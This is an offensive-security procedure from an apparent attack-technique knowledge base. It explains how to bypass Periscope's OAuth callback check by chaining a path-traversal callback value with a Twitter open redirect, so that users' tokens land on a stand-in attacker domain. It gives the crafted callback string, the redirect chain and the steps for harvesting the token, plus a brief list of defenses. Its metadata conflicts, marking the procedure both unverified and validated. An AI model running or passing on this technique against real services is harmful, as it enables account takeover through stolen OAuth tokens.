---
id: uuid-4
tags:
  - path-traversal
  - open-redirect
  - oauth-bypass
type: procedure
tools: []
tactics:
  - '[[Credential Access]]'
commands: []
verified: false
platforms:
  - Web
  - Mobile
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-14T17:33:34.358Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Credential Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
---
# Bypass-OAuth-Callback-Locking-with-Path-Traversal-and-Open-Redirect

## Summary

Exploit Periscope's incomplete callback URL validation using path traversal to inject a Twitter open redirect, allowing token redirection to an attacker site while preserving fragments.

## Description

Periscope blocks http/https callbacks but checks partial URIs, allowing `../` traversal to prepend schemes. Chain with Twitter's `redirect_after_login` to cards.twitter.com, which fallbacks to external sites. Targets OAuth flow post-authorization. Outcome: Token in attacker URL fragment.

## Requirements

1. Request token with traversable callback set.
2. Control over Twitter card ID for fallback redirect.
3. Attacker domain ready.

## Defense

Defensive measures and detection strategies:

- Validate full callback URIs, not partial paths.
- Block traversal patterns in URL parsing.
- Audit redirect whitelists for fallback leaks.

## Objectives

1. Evade protocol restrictions.
2. Chain redirects to steal token.
3. Preserve fragment data.

## Instructions

### Step 1: Set Traversable Callback

**Context**: During request token, use partial path.

Callback: `a/../../login?redirect_after_login=https://cards.twitter.com/card_id` where card_id fallbacks to `http://attacker.com`.

> Traversal resolves to `https://twitter.com/login?...`, bypassing Periscope check.

### Step 2: Trigger Redirect Chain

**Context**: Post-authorization, Periscope calls back to Twitter.

Victim auth → Periscope callback → Twitter login redirect → cards.twitter.com → attacker.com#token.

> Ensure card is pre-configured with fallback.

### Step 3: Validate Bypass

**Context**: Confirm token reaches attacker site.

Parse URL fragment for `oauth_token` and verifier.

> Success: Full token data without protocol block.

## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access]] Credential Access

### Techniques

- [[Drive-by Compromise]] Drive-by Compromise

### Sub-Techniques

-

## Commands Used

-

## Tools Used

-

## Tags

- [[path-traversal]]
- [[open-redirect]]
